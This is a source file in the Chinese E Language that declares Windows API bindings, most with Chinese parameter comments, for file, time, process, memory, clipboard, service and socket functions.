.DLL命令 SHGetSpecialFolderLocation, 整数型, "shell32.dll", "SHGetSpecialFolderLocation", , 
    .参数 窗口句柄, 整数型, , hwndOwner
    .参数 文件夹位置, 整数型, , nFolder
    .参数 结构, 项目标识符列表_, 传址, pIdl

.DLL命令 CoTaskMemFree, 空白型, "ole32.dll", "", , 
    .参数 pv, 整数型, , 

.DLL命令 SHFileOperationA, 整数型, "shell32.dll", "SHFileOperationA", , 
    .参数 文件参数, SHFILEOPSTRUCT, , 

.DLL命令 SHEmptyRecycleBinA, 空白型, "shell32.dll", "SHEmptyRecycleBinA", , 
    .参数 句柄, 整数型, , 
    .参数 pszRootPath, 文本型, , 
    .参数 dwFlags, 整数型, , 

.DLL命令 MoveFileExA, 逻辑型, "kernel32.dll", "MoveFileExA", , 
    .参数 lpExistingFileName, 文本型, , 
    .参数 lpNewFileName, 文本型, , 
    .参数 dwFlags, 整数型, , 

.DLL命令 DeleteFileA, 整数型, "kernel32.dll", "DeleteFileA", , 
    .参数 lpFileName, 文本型, , 

.DLL命令 GetTempPathA, 整数型, "kernel32.dll", "GetTempPathA", , 
    .参数 nBufferLength, 整数型, , 
    .参数 lpBuffer, 文本型, , 

.DLL命令 GetTempFileNameA, 整数型, "kernel32.dll", "GetTempFileNameA", , 
    .参数 lpszPath, 文本型, , 
    .参数 lpPrefixString, 整数型, , 
    .参数 wUnique, 整数型, , 
    .参数 lpTempFileName, 文本型, , 

.DLL命令 lopen, 整数型, "kernel32.dll", "_lopen", , 
    .参数 lpPathName, 文本型, , 
    .参数 iReadWrite, 整数型, , 

.DLL命令 GetFileSize, 整数型, "kernel32.dll", "GetFileSize", , 
    .参数 hFile, 整数型, , 文件号
    .参数 lpFileSizeHigh, 整数型, 传址, 

.DLL命令 GetFileAttributesA, 整数型, "kernel32.dll", "GetFileAttributesA", , 
    .参数 lpFileName, 文本型, , 

.DLL命令 SetFileAttributesA, 逻辑型, "kernel32.dll", "SetFileAttributesA", , 
    .参数 lpFileName, 文本型, , 
    .参数 dwFileAttributes, 整数型, , 

.DLL命令 SystemTimeToVariantTime, 整数型, "oleaut32.dll", "SystemTimeToVariantTime", , 
    .参数 LPSYSTEMTIME, 系统时间, 传址, 
    .参数 double, 日期时间型, 传址, 

.DLL命令 VariantTimeToSystemTime, 整数型, "oleaut32.dll", "VariantTimeToSystemTime", , 
    .参数 double, 日期时间型, , 
    .参数 LPSYSTEMTIME, 系统时间, 传址, 

.DLL命令 SystemTimeToFileTime, 整数型, "kernel32.dll", "SystemTimeToFileTime", , 
    .参数 lpSystemTime, 系统时间, 传址, 
    .参数 lpFileTime, FILETIME, 传址, 

.DLL命令 GetFileTime, 整数型, "kernel32.dll", "GetFileTime", , 
    .参数 hFile, 整数型, , 
    .参数 lpCreationTime, FILETIME, 传址, 
    .参数 lpLastAccessTime, FILETIME, 传址, 
    .参数 lpLastWriteTime, FILETIME, 传址, 

.DLL命令 FileTimeToLocalFileTime, 整数型, "kernel32.dll", "FileTimeToLocalFileTime", , 
    .参数 lpFileTime, FILETIME, 传址, 
    .参数 lpLocalFileTime, FILETIME, 传址, 

.DLL命令 LocalFileTimeToFileTime, 整数型, "kernel32.dll", "LocalFileTimeToFileTime", , 
    .参数 lpLocalFileTime, FILETIME, 传址, 
    .参数 lpFileTime, FILETIME, 传址, 

.DLL命令 SetFileTime, 逻辑型, "kernel32.dll", "SetFileTime", , 
    .参数 hFile, 整数型, , 
    .参数 lpCreationTime, FILETIME, 传址, 
    .参数 lpLastAccessTime, FILETIME, 传址, 
    .参数 lpLastWriteTime, FILETIME, 传址, 

.DLL命令 CopyFileA, 整数型, "kernel32.dll", "CopyFileA", , 
    .参数 lpExistingFileName, 文本型, , 
    .参数 lpNewFileName, 文本型, , 
    .参数 bFailIfExists, 整数型, , 

.DLL命令 GetMessageTime, 整数型, "user32.dll", "GetMessageTime", 公开, ,GetMessageTime

.DLL命令 GetLocalTime, 整数型, "kernel32.dll", "GetLocalTime", 公开, GetLocalTime
    .参数 系统时间格式, 系统时间, 传址, 

.DLL命令 OpenFile, 整数型, "kernel32.dll", "OpenFile", 公开, OpenFile$(b)Long，如执行成功，返回文件句柄。  打开一个普通文件，以对文件进行输入或输出。成功返回被打开文件的文件号，失败返回 -1。本命令为初级命令。
    .参数 文件名, 文本型, , lpFileName，欲打开文件的名字
    .参数 文件操作结果, 文件结构信息_, 传址, lpReOpenBuff，文件操作结果 文件结构信息
    .参数 操作方式, 整数型, , wStyle，操作方式  一般为32

.DLL命令 CallWindowProcC, 整数型, "user32.dll", "CallWindowProcA", , 
    .参数 子程序指针, 子程序指针, , 
    .参数 参数1, 整数型, , 
    .参数 参数2, 整数型, , 
    .参数 参数3, 整数型, , 
    .参数 参数4, 整数型, , 

.DLL命令 WriteFile, 逻辑型, "kernel32.dll", "WriteFile", , （非零）表示成功，否则返回零。
    .参数 文件句柄, 整数型, , hFile，一个文件的句柄
    .参数 数据缓冲区, 字节集, 传址, lpBuffer，要写入的一个数据缓冲区
    .参数 欲写入字节数量, 整数型, , nNumberOfBytesToWrite，要写入数据的字节数量。如写入零字节，表示什么都不写入，但会更新文件的“上一次修改时间”。针对位于远程系统的命名管道，限制在65535个字节以内
    .参数 实际写入字节数量, 整数型, 传址, lpNumberOfBytesWritten，实际写入文件的字节数量
    .参数 特殊结构, 整数型, , lpOverlapped，倘若在指定FILE_FLAG_OVERLAPPED的前提下打开文件，这个参数就必须引用一个特殊的结构。那个结构定义了一次异步写操作。否则，该参数应置为空（将声明变为ByVal As Long，并传递零值）

.DLL命令 GetLastError, 整数型, "kernel32.dll", "GetLastError", , 

.DLL命令 FormatMessageA, 整数型, "kernel32.dll", "FormatMessageA", , 
    .参数 dwFlags, 整数型, , 
    .参数 lpSource, 整数型, , Any
    .参数 消息ID, 整数型, , 
    .参数 语言ID, 整数型, , 现在系统不支持了，置0
    .参数 缓冲区, 文本型, , 
    .参数 缓冲区大小, 整数型, , 
    .参数 Arguments, 整数型, , 

.DLL命令 ReadFile, 整数型, "kernel32.dll", "ReadFile", , ""
    .参数 hFile, 整数型, , 文件的句柄
    .参数 lpBuffer, 字节集, 传址, 用于保存读入数据的一个缓冲区
    .参数 nNumberOfBytesToRead, 整数型, , 要读入的字符数
    .参数 lpNumberOfBytesRead, 整数型, 传址, 从文件中实际读入的字符数
    .参数 lpOverlapped, 整数型, , 如文件打开时指定了FILE_FLAG_OVERLAPPED，那么必须用这个参数引用一个特殊的结构。那个结构定义了一次异步读取操作。否则，应将这个参数设为NULL（将函数声明成ByVal As Long，并传递零值）

.DLL命令 CreateFile, 整数型, "kernel32.dll", "CreateFileA", , ""
    .参数 lpFileName, 文本型, , ""
    .参数 dwDesiredAccess, 整数型, , ""
    .参数 dwShareMode, 整数型, , ""
    .参数 lpSecurityAttributes, 整数型, , ""
    .参数 dwCreationDisposition, 整数型, , ""
    .参数 dwFlagsAndAttributes, 整数型, , ""
    .参数 hTemplateFile, 整数型, , ""

.DLL命令 SetFilePointer, 整数型, "kernel32.dll", "SetFilePointer", , ""
    .参数 hFile, 整数型, , ""
    .参数 lDistanceToMove, 整数型, , ""
    .参数 lpDistanceToMoveHigh, 整数型, 传址, ""
    .参数 dwMoveMethod, 整数型, , ""

.DLL命令 GlobalHandle, 整数型, "kernel32.dll", "GlobalHandle", , 
    .参数 wMem, 整数型, , 

.DLL命令 GlobalSize, 整数型, "kernel32.dll", "GlobalSize", , 
    .参数 hMem, 整数型, , 

.DLL命令 TerminateProcess, 整数型, "kernel32.dll", "TerminateProcess", 公开, 结束一个进程 Long，非零表示成功，零表示失败。会设置GetLastError
    .参数 进程句柄, 整数型, , hProcess Long，指定要中断的一个进程的句柄
    .参数 退出代码, 整数型, , uExitCode Long，进程的一个退出代码

.DLL命令 OpenProcess, 整数型, "kernel32.dll", "OpenProcess", , 
    .参数 访问级别, 整数型, , 2035711完全访问
    .参数 子进程继承, 整数型, , 0为子进程继承
    .参数 进程ID, 整数型, , 要打开的进程标识

.DLL命令 WindowFromPoint, 整数型, "user32.dll", "WindowFromPoint", 公开, 取指定坐标位置所在窗口组件的句柄(返回句柄)
    .参数 X轴光标, 整数型, , 
    .参数 Y轴光标, 整数型, , 

.DLL命令 GetCurrentProcessId, 整数型, "kernel32.dll", "GetCurrentProcessId", 公开, 获取当前进程一个唯一的标识符 GetCurrentProcessId  

.DLL命令 CreateToolhelp32Snapshot, 整数型, "kernel32.dll", "CreateToolhelp32Snapshot", 公开, 取进程信息 CreateToolhelp32Snapshot  返回快照句柄
    .参数 标志, 整数型, , lFlags  一般填写8即可
    .参数 进程标识符, 整数型, , lProcessID

.DLL命令 Module32First, 整数型, "kernel32.dll", "Module32First", 公开, Module32First  返回模块数目
    .参数 快照句柄, 整数型, , hSnapshot
    .参数 模块进程结构, 进程信息_, 传址, uProcess

.DLL命令 Module32Next, 整数型, "kernel32.dll", "Module32Next", 公开, Module32Next 返回模块数目
    .参数 快照句柄, 整数型, , hSnapshot
    .参数 模块进程结构, 进程信息_, 传址, uProcess

.DLL命令 GetWindowThreadProcessId, 整数型, "user32.dll", "GetWindowThreadProcessId", , GetWindowThreadProcessId，获取与指定窗口关联在一起的一个线程和进程标识符
    .参数 窗口句柄, 整数型, , hwnd，指定窗口句柄
    .参数 进程标识符, 整数型, 传址, lpdwProcessId，指定一个变量，用于装载拥有那个窗口的一个进程的标识符

.DLL命令 ExitThread, 整数型, "kernel32.dll", "ExitThread", 公开, ExitThread
    .参数 线程句柄, 整数型, , 

.DLL命令 GetCurrentProcess, 整数型, "kernel32.dll", "GetCurrentProcess", 公开, GetCurrentProcess$(b)获取当前进程的一个伪句柄  当前进程的伪句柄 一般是-1

.DLL命令 GetCurrentThread, 整数型, "kernel32.dll", "GetCurrentThread", 公开, GetCurrentThread$(b)获取当前线程的一个伪句柄  当前线程的伪句柄一般是-2

.DLL命令 GetThreadPriority, 整数型, "kernel32.dll", "GetThreadPriority", 公开, GetThreadPriority
    .参数 线程句柄, 整数型, , 线程句柄

.DLL命令 GetPriorityClass, 整数型, "kernel32.dll", "GetPriorityClass", 公开, GetPriorityClass$(b)获取特定进程的优先级别  进程的优先级，零表示失败。会设置GetLastError
    .参数 进程句柄, 整数型, , 进程句柄;

.DLL命令 SetThreadPriority, 整数型, "kernel32.dll", "SetThreadPriority", 公开, $(b)设定线程的优先级别  非零表示成功，零表示失败。会设置GetLastError
    .参数 线程句柄, 整数型, , hThread
    .参数 优先权, 整数型, , nPriority 例如:-2 更过自己去搜索下

.DLL命令 SetPriorityClass, 整数型, "kernel32.dll", "SetPriorityClass", 公开, $(b)设置一个进程的优先级别  进程的优先级，零表示失败。会设置GetLastError
    .参数 进程句柄, 整数型, , 
    .参数 级别, 整数型, , 例如:64 更过自己去搜索下

.DLL命令 SetProcessAffinityMask, 整数型, "kernel32.dll", "SetProcessAffinityMask", 公开, 设置CPU亲和性  进程句柄  返回CPU号SetProcessAffinityMask
    .参数 进程句柄, 整数型, , hProcess
    .参数 参数, 整数型, , Mask

.DLL命令 SetThreadAffinityMask, 整数型, "kernel32.dll", "SetThreadAffinityMask", 公开, 设置CPU亲和性  线程句柄SetThreadAffinityMask
    .参数 线程句柄, 整数型, , hProcess
    .参数 参数, 整数型, , Mask

.DLL命令 SHCreateThread, 整数型, "shlwapi.dll", "SHCreateThread", 公开, SHCreateThread
    .参数 线程地址, 整数型, , pfnThreadProc
    .参数 数据, 整数型, , pData，Any
    .参数 标志, 整数型, , dwFlags
    .参数 返回信息, 整数型, , pfnCallback

.DLL命令 CreateProcessA, 整数型, "kernel32.dll", "CreateProcessA", 公开, 
    .参数 执行程序文件名, 文本型, , lpApplicationName
    .参数 参数行, 文本型, , lpCommandLine
    .参数 进程安全参数, 整数型, , lpProcessAttributes
    .参数 线程安全参数, 整数型, , lpThreadAttributes
    .参数 继承性, 逻辑型, , bInheritHandles
    .参数 创建标记, 整数型, , dwCreationFlags
    .参数 环境变量, 整数型, , lpEnvironment
    .参数 运行该子进程的初始目录, 整数型, , lpCurrentDirectory
    .参数 创建该子进程的相关参数, 启动信息数据, , lpStartupInfo
    .参数 创建后用于被创建子进程的信息, 创建进程返回数据类型, , lpProcessInformation  

.DLL命令 ExitProcess, 整数型, "kernel32.dll", "ExitProcess", 公开, 
    .参数 进程句柄, 整数型, , 

.DLL命令 ZwSuspendProcess, 整数型, "ntdll.dll", "ZwSuspendProcess", , 暂停进程
    .参数 hProcess, 整数型, , OpenProcess函数返回的进程句柄

.DLL命令 ZwResumeProcess, 整数型, "ntdll.dll", "ZwResumeProcess", , 恢复进程
    .参数 hProcess, 整数型, , OpenProcess函数返回的进程句柄

.DLL命令 WaitForInputIdle, 整数型, "user32.dll", "WaitForInputIdle", , 监测进程空闲
    .参数 hProcess, 整数型, , 
    .参数 dwMilliseconds, 整数型, , 

.DLL命令 OpenProcessToken, 逻辑型, "advapi32.dll", "OpenProcessToken", , 打开过程令牌对象
    .参数 进程句柄, 整数型, , 
    .参数 权限, 整数型, , 
    .参数 令牌句柄, 整数型, 传址, 

.DLL命令 LookupPrivilegeValueA, 逻辑型, "advapi32.dll", "LookupPrivilegeValueA", , 
    .参数 lpSystemName, 文本型, , 
    .参数 lpName, 文本型, , 
    .参数 lpLuid, LuID, 传址, 

.DLL命令 AdjustTokenPrivileges, 逻辑型, "advapi32.dll", "AdjustTokenPrivileges", , 
    .参数 TokenHandle, 整数型, , 
    .参数 DisableAllPrivileges, 整数型, , 
    .参数 NewState, 进程权限, 传址, 
    .参数 BufferLength, 整数型, , 
    .参数 PreviousState, 进程权限, 传址, 
    .参数 ReturnLength, 整数型, 传址, 

.DLL命令 ReadProcessMemory_文本, 逻辑型, "", "ReadProcessMemory", , 
    .参数 hProcess, 整数型, , 
    .参数 lpBaseAddress, 整数型, , 
    .参数 lpBuffer, 文本型, 传址, 
    .参数 nSize, 整数型, , 
    .参数 lpNumberOfBytesRead, 整数型, , 

.DLL命令 ReadProcessMemory_字节集, 整数型, "", "ReadProcessMemory", , 
    .参数 hProcess, 整数型, , 
    .参数 lpBaseAddress, 整数型, , 
    .参数 lpBuffer, 字节集, 传址, 
    .参数 nSize, 整数型, , 
    .参数 lpNumberOfBytesWritten, 整数型, , 

.DLL命令 ReadProcessMemory_整数, 整数型, "", "ReadProcessMemory", , 
    .参数 hProcess, 整数型, , 
    .参数 lpBaseAddress, 整数型, , 内存地址
    .参数 lpBuffer, 整数型, 传址, 数据指针
    .参数 nSize, 整数型, , 长度
    .参数 lpNumberOfBytesWritten, 整数型, , 实际写出长度

.DLL命令 WriteProcessMemory_字节集, 整数型, "kernel32.dll", "WriteProcessMemory", , 
    .参数 hProcess, 整数型, , 
    .参数 pBaseAddress, 整数型, , 内存地址
    .参数 lpBuffer, 字节集, 传址, 数据指针
    .参数 nSize, 整数型, , 长度
    .参数 lpNumberOfBytesWritten, 整数型, , 实际写出长度

.DLL命令 WriteProcessMemory_整数, 整数型, "kernel32.dll", "WriteProcessMemory", , 
    .参数 hProcess, 整数型, , 
    .参数 pBaseAddress, 整数型, , 内存地址
    .参数 lpBuffer, 整数型, 传址, 数据指针
    .参数 nSize, 整数型, , 长度
    .参数 lpNumberOfBytesWritten, 整数型, , 实际写出长度

.DLL命令 WriteProcessMemory_文本, 整数型, "kernel32.dll", "WriteProcessMemory", , 
    .参数 hProcess, 整数型, , 
    .参数 pBaseAddress, 整数型, , 内存地址
    .参数 lpBuffer, 文本型, 传址, 数据指针
    .参数 nSize, 整数型, , 长度
    .参数 lpNumberOfBytesWritten, 整数型, , 实际写出长度

.DLL命令 RtlMoveMemory_写文本, 空白型, "kernel32.dll", "RtlMoveMemory", , 
    .参数 目标数据, 整数型, , any
    .参数 原数据, 文本型, 传址, any
    .参数 尺寸, 整数型, , 

.DLL命令 RtlMoveMemory_写整数, 空白型, "kernel32.dll", "RtlMoveMemory", , 
    .参数 目标数据, 整数型, , any
    .参数 原数据, 整数型, 传址, any
    .参数 尺寸, 整数型, , 

.DLL命令 RtlMoveMemory_写字节, 空白型, "kernel32.dll", "RtlMoveMemory", , 
    .参数 目标数据, 整数型, , any
    .参数 原数据, 字节型, 传址, any
    .参数 尺寸, 整数型, , 

.DLL命令 RtlMoveMemory_写字节集, 空白型, "kernel32.dll", "RtlMoveMemory", , 
    .参数 目标数据, 整数型, , any
    .参数 原数据, 字节集, 传址, any
    .参数 尺寸, 整数型, , 

.DLL命令 GetLastInputInfo, 整数型, "", "GetLastInputInfo", , 取空闲时间
    .参数 LASTINPUTINFO, 空闲时间, 传址, 

.DLL命令 FlashWindow, 空白型, "user32.dll", "FlashWindow", 公开, 
    .参数 窗口句柄, 整数型, , 
    .参数 闪动, 逻辑型, , 是否闪动窗口

.DLL命令 GetComputerNameA, 整数型, "kernel32.dll", "GetComputerNameA", , 
    .参数 lpBuffer, 文本型, , 
    .参数 nSize, 整数型, 传址, 

.DLL命令 GetVersionExA, 整数型, "kernel32.dll", "GetVersionExA", , 
    .参数 lpVersionInformation, OSVERSIONINFO, 传址, 可能为 OSVERSIONINFO 结构。

.DLL命令 MD5Update_文本, 整数型, "advapi32.dll", "MD5Update", 公开, 开始编码
    .参数 PROTO_LIST, MD5_CTX, , 
    .参数 数据, 文本型, , 也可以是字节集等
    .参数 数据长, 整数型, , 

.DLL命令 MD5Update_字节集, 整数型, "advapi32.dll", "MD5Update", 公开, 开始编码
    .参数 PROTO_LIST, MD5_CTX, , 
    .参数 数据, 字节集, , 也可以是字节集等
    .参数 数据长, 整数型, , 

.DLL命令 MD5Final, 整数型, "advapi32.dll", "MD5Final", 公开, 完成
    .参数 PROTO_LIST, MD5_CTX, , 

.DLL命令 MD5Init, 整数型, "advapi32.dll", "MD5Init", 公开, 初始化
    .参数 PROTO_LIST, MD5_CTX, , 

.DLL命令 CloseClipboard, 整数型, "user32.dll", "CloseClipboard", 公开, 0为失败

.DLL命令 OpenClipboard, 整数型, "user32.dll", "OpenClipboard", 公开, (0为失败)
    .参数 窗口句柄, 整数型, , hwnd,窗口句柄

.DLL命令 GetClipboardSequenceNumber, 整数型, "user32.dll", "GetClipboardSequenceNumber", 公开, 

.DLL命令 IsClipboardFormatAvailable, 整数型, "user32.dll", "IsClipboardFormatAvailable", 公开, (0为失败)
    .参数 wFormat, 整数型, , CF_TEXT

.DLL命令 GetClipboardData, 整数型, "user32.dll", "GetClipboardData", 公开, 返回剪贴板数据句柄 
    .参数 剪贴板格式, 整数型, , wFormat

.DLL命令 SetHandleCount_文本, 整数型, "Kernel32.dll", "SetHandleCount", 公开, 
    .参数 文本, 文本型, , 

.DLL命令 SetHandleCount_字节集, 整数型, "Kernel32.dll", "SetHandleCount", 公开, 
    .参数 字节集, 字节集, , 

.DLL命令 SetHandleCount_整数, 整数型, "Kernel32.dll", "SetHandleCount", 公开, 
    .参数 整数, 整数型, , 

.DLL命令 SetHandleCount_子程序指针, 整数型, "Kernel32.dll", "SetHandleCount", 公开, 程序指针
    .参数 程序指针, 子程序指针, , 

.DLL命令 gethostbyname, 整数型, "ws2_32.dll", "gethostbyname", 公开, 
    .参数 name, 文本型, , 

.DLL命令 WSAStartup, 整数型, "wsock32.dll", "", 公开, 
    .参数 VersionReq, 整数型, , 
    .参数 WSADataReturn, WSADATA, 传址, 

.DLL命令 WSACleanup, 整数型, "ws2_32.dll", "WSACleanup", 公开, 

.DLL命令 RtlMoveMemory_HOSTENT, 整数型, "kernel32.dll", "RtlMoveMemory", 公开, 
    .参数 Destination, HOSTENT, 传址, 
    .参数 Source, 整数型, , 
    .参数 Length, 整数型, , 

.DLL命令 RtlMoveMemory_字节型, 整数型, "kernel32.dll", "RtlMoveMemory", 公开, 
    .参数 Destination, 字节型, 传址 数组, 
    .参数 Source, 整数型, , 
    .参数 Length, 整数型, , 

.DLL命令 ReadProcessMemory_字节型数组, 整数型, "kernel32", "ReadProcessMemory", 公开, 
    .参数 hProcess, 整数型, , 
    .参数 lpBaseAddress, 字节型, 传址 数组, 传址
    .参数 lpBuffer, 字节集, , 
    .参数 nSize, 整数型, , 
    .参数 lpNumberOfBytesWritten, 整数型, , 

.DLL命令 MapVirtualKeyA, 整数型, "", "MapVirtualKeyA", 公开, 返回转换后的代码
    .参数 wCode, 整数型, , 代码值
    .参数 wMapType, 整数型, , 0--虚拟键码->扫描码；1--扫描码->虚拟键码；2-虚拟键码->ASCII值（未加Shift组合键）。

.DLL命令 CreateServiceA, 整数型, "advapi32.dll", "CreateServiceA", 公开, 创建服务,创建服务
    .参数 hSCManager, 整数型, , SCM句柄OpenSCManager返回值
    .参数 lpServiceName, 文本型, , 指向一个以0字符结尾的表示服务名称的字符串，字符串的最大长度是256个字符字符串的最大长度是256个字符，名称中不允许使用/或者\字符（因为这些字符会和注册表的路径表示方式冲突），这个值和注册表中的键名是相对应的
    .参数 lpDisplayName, 文本型, , 指向一个以0字符结尾表示服务名称的字符串，这个名称是供用户界面程序识别函数时使用的，同样，它的最大长度也是256个字符。这个值和注册表中的DisplayName键的值是相对应的
    .参数 dwDesiredAccess, 整数型, , 指定需要访问服务的操作可以有以下取值：SERVICE_ALL_ACCESS--可以进行所有操作SERVICE_START--允许调用StartService函数来启动服SERVICE_STOP--允许调用ControlService函数来停止服务DELETE--允许调用DeleteService函数来删除服务
    .参数 dwServiceType, 整数型, , 服务的类型我们的教程中只用得到SERVICE_KERNEL_DRIVER，这个值和注册表中的Type键的值是相对应的
    .参数 dwStartType, 整数型, , 表示在什么时候启动服务，如果我们需要手动启动驱动的话，那么使用SERVICE_DEMAND_START参数，如果驱动程序需要在系统启动的时候就被启动，那么使用SERVICE_AUTO_START参数，这个取值和注册表中的Start键的取值是相对应的
    .参数 dwErrorControl, 整数型, , 表示当驱动初始化的时候出错该如何处理，取值SERVICE_ERROR_IGNORE表示忽略错误，取值SERVICE_ERROR_NORMAL表示将错误记录到系统日志中去，这个取值和注册表中的ErrorControl键值是相对应的
    .参数 lpBinaryPathName, 文本型, , 指向以0结尾的表示驱动程序文件名的字符串，这个值和注册表中的ImagePath的键值是相对应的
    .参数 lpLoadOrderGroup, 整数型, , 指向以0结尾的表示组名称的字符串，表示该驱动属于哪个组，既然我们的例子程序不属于任何组，那么这里就用NULL好了
    .参数 lpdwTagId, 整数型, , 指向一个32位的缓冲区，用来接收驱动在lpLoadOrderGroup参数指定的组中的唯一的标识，我们的例子中不需要用到这个表示，所以参数指定为NULL
    .参数 lpDependencies, 整数型, , 对于驱动程序来说，这个参数没什么用途，设置为NULL好了
    .参数 lpServiceStartName, 整数型, , 指向一个以0结尾的表示帐号名称的字符串，用于指定服务允许在哪个帐号下运行，如果服务类型是SERVICE_KERNEL_DRIVER的话，该帐号就是系统装入服务的模块名称，我们在这里使用NULL，表示由默认的模块装入
    .参数 lpPassword, 整数型, , 对于驱动程序来说，这个参数没什么用途，设置为NULL好了

.DLL命令 OpenServiceA, 整数型, "advapi32.dll", "OpenServiceA", 公开, 打开服务,
    .参数 hSCManager, 整数型, , 由CreateServiceA返回的句柄
    .参数 lpServiceName, 文本型, , 服务名称
    .参数 dwDesiredAccess, 整数型, , 983551指定需要访问服务的操作

.DLL命令 StartServiceA, 整数型, "advapi32.dll", "StartServiceA", 公开, 开始启动系统服务,开始运行服务
    .参数 服务句柄, 整数型, , CreateService返回的驱动的句柄
    .参数 dwNumServiceArgs, 整数型, , 0
    .参数 lpServiceArgVectors, 整数型, , 0

.DLL命令 CloseServiceHandle, 整数型, "advapi32.dll", "CloseServiceHandle", 公开, 关闭SC服务管理句柄_,
    .参数 SC对象句柄, 整数型, , 由OpenSCManagerA和CreateServiceA返回的句柄关闭时应关闭两个

.DLL命令 CreateFileA, 整数型, "kernel32.dll", "CreateFileA", 公开, 创建文件_,这是一个全功能的例程可打开和创建文件、管道、邮槽、通信服务、设备以及控制台 ――返回值:如执行成功则返回文件句柄.INVALID_HANDLE_VALUE表示出错会设置GetLastError.即使函数成功但若文件存在且指定了CREATE_ALWAYS 或 OPEN_ALWAYSGetLastError也会设为ERROR_ALREADY_EXISTS 例子：查看例程API程序自杀
    .参数 打开文件名, 文本型, , lpFileName要打开的文件的名字
    .参数 访问权限, 整数型, , dwDesiredAccess如果为 GENERIC_READ 表示允许对设备进行读访问;如果为 GENERIC_WRITE 表示允许对设备进行写访问（可组合使用）;如果为零表示只允许获取与一个设备有关的信息
    .参数 共享方式, 整数型, , dwShareMode
    .参数 安全特性, 整数型, , lpSecurityAttributes是指向SECURITY_ATTRIBUTES结构的指针，指定了目录的安全属性，但要求文件系统支持如NTFS的格式。Windows 98不支持此属性，在函数调用时应设置为NULL
    .参数 创建方式, 整数型, , dwCreationDispositiondwCreationDisposition Long下述常数之一:
    .参数 文件属性, 整数型, , dwFlagsAndAttributesdwFlagsAndAttributes Long一个或多个下述常数
    .参数 从文件复制文件属性, 整数型, , hTemplateFile如果不为零则指定一个文件句柄.新文件将从这个文件中复制扩展属性

.DLL命令 ControlService, 整数型, "advapi32.dll", "ControlService", 公开, 停止系统服务_,用来停止系统服务
    .参数 hService, 整数型, , 用 OpenService 返回的句柄
    .参数 dwControl, 整数型, , 用于驱动程序的时候，这个参数总是设置为NULL
    .参数 lpServiceStatus, SERVICE_STATUS, 传址, 同上，也为NULL

.DLL命令 OpenSCManagerA, 整数型, "advapi32.dll", "OpenSCManagerA", 公开, 打开SC管理服务_,建立服务首先应用此函数打开然后再用OpenServiceA打开服务获得服务控制管理器数据库的句柄
    .参数 机器名称, 文本型, , lpMachineName用取本机名取得就是本机的名称指向需要打开的计算机名字符串，字符串以NULL结尾，如果参数指定为NULL，表示连接到本机上的SCM
    .参数 数据库名, 文本型, , lpDatabaseName指向以NULL结尾的包含SCM数据库名称的字符串，字符串应该指定为"ServicesActive"，如果参数指定为NULL，则默认打开"ServicesActive"
    .参数 数据库, 整数型, , dwDesiredAccess指定访问SCM的权限，这个参数告诉SCM我们需要进行什么样的操作，常用的取值有三个：SC_MANAGER_CREATE_SERVICESC_MANAGER_CREATE_SERVICESC_MANAGER_ALL_ACCESS

.DLL命令 DeleteService, 整数型, "advapi32.dll", "DeleteService", 公开, 删除服务,成功返回0失败返回非0
    .参数 hService, 整数型, , OpenSCManager的数据库句柄

.DLL命令 DeviceIoControl, 整数型, "kernel32.dll", "DeviceIoControl", 公开, 设备操作_,对设备执行指定的操作
    .参数 设备句柄, 整数型, , hDevice设备句柄
    .参数 控制参数, 整数型, , dwIoControlCode带有 FSCTL_ 前缀的常数.参考设备控制选项的部分列表设备控制选项的部分列表――参考DeviceIoControl函数
    .参数 参数一, 整数型, , lpInBuffer具体取决于dwIoControlCode参数.参考设备控制选项的部分列表
    .参数 参数二, 整数型, , nInBufferSize输入缓冲区的长度
    .参数 参数三, 空白型, , lpOutBuffer Anyany型根据实际需要修改 具体取决于dwIoControlCode参数.参考设备控制选项的部分列表
    .参数 参数四, 整数型, , nOutBufferSize输出缓冲区的长度
    .参数 缓冲区字节数, 整数型, , lpBytesReturned实际装载到输出缓冲区的字节数量
    .参数 OVERLAPPED结构地址, 重叠操作_, , lpOverlappedOVERLAPPED这个结构用于重叠操作.针对同步操作请用ByVal As Long传递零值

.DLL命令 VirtualQueryEx, 整数型, "kernel32", "VirtualQueryEx", , 
    .参数 hProcess, 整数型, , 对象的进程句柄,可以使用函数 OpenProcess() 返回。
    .参数 lpAddress, 整数型, , 对象指针地址
    .参数 lpBuffer, 虚拟信息, , 返回的虚拟信息
    .参数 dwLength, 整数型, , 信息长度,已知 28

.DLL命令 VirtualProtectEx, 逻辑型, "kernel32", "VirtualProtectEx", , 
    .参数 hProcess, 整数型, , 对象的进程句柄,可以使用函数 OpenProcess() 返回。
    .参数 lpAddress, 整数型, , 虚拟信息.BaseAddress
    .参数 dwSize, 整数型, , 虚拟信息.RegionSize
    .参数 flNewProtect, 整数型, , 修改类型,#PAGE_EXECUTE_READWRITE 64为可读写模式
    .参数 lpflOldProtect, 整数型, 传址, 虚拟信息.Protect

.DLL命令 ShowCursor, 空白型, "", "ShowCursor ", 公开, 设置鼠标隐藏
    .参数 整数, 空白型, , 

.DLL命令 DragAcceptFiles, 整数型, "", "DragAcceptFiles", , 
    .参数 hwnd, 整数型, , 
    .参数 fAccept, 逻辑型, , 

.DLL命令 DragFinish, 整数型, "", "DragFinish", , 
    .参数 hDrop, 整数型, , 

.DLL命令 WideCharToMultiByte, 整数型, "", "WideCharToMultiByte", 公开, 双字到单字
    .参数 代码页, 整数型, , CodePage
    .参数 标志, 整数型, , dwFlags
    .参数 双字符文本, 整数型, , lpWideCharStr
    .参数 双字符文本长度, 整数型, , cchWideChar
    .参数 单字文本, 空白型, , lpMultiByteStr
    .参数 单字文本长度, 整数型, , cchMultiByte
    .参数 默认宽字符文本, 整数型, , lpDefaultChar
    .参数 使用默认文本, 整数型, , lpUsedDefaultChar

.DLL命令 GetProcessHeap, 整数型, "", "GetProcessHeap", 公开, 获取调用过程堆句柄

.DLL命令 RtlMoveMemory_整数, 整数型, "", "RtlMoveMemory", 公开, RtlMoveMemory
    .参数 目标数据地址, 整数型, , lpvDest
    .参数 源数据, 整数型, , lpvSource
    .参数 尺寸, 整数型, , cbCopy

.DLL命令 HeapAlloc, 整数型, "", "HeapAlloc", 公开, HeapAlloc，从堆中分配内存
    .参数 堆栈句柄, 整数型, , hHeap
    .参数 标志, 整数型, , dwFlags
    .参数 分配大小, 整数型, , dwBytes

.DLL命令 HeapFree, 整数型, "", "HeapFree", 公开, 释放堆栈内存A
    .参数 堆栈句柄, 整数型, , hHeap
    .参数 标志, 整数型, , dwFlags
    .参数 内存块句柄, 整数型, , any，lpMem

.DLL命令 RegEnumValueA, 整数型, "advapi32.dll", "RegEnumValueA", , 零（ERROR_SUCCESS）表示成功。其他任何值都代表一个错误代码
